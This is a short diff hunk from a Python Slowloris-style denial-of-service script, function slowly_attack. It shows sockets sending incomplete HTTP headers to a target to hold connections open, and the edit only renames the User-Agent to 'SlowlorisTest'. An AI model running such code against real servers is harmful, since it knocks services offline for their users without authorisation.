@@ -34,7 +34,7 @@ def slowly_attack(target_host, target_port, num_sockets, sleep_time):
             sock.connect((target_host, target_port))
             sock.sendall("GET / HTTP/1.1\r\n".encode("utf-8"))
             sock.sendall(f"Host: {target_host}\r\n".encode("utf-8"))
-            sock.sendall("User-Agent: Slowloris\r\n".encode("utf-8"))
+            sock.sendall("User-Agent: SlowlorisTest\r\n".encode("utf-8"))     # you can change the "User-Agent" Header value 
             sock.sendall("Content-Length: 10000\r\n".encode("utf-8"))
             sockets.append(sock)
         except socket.error as e:
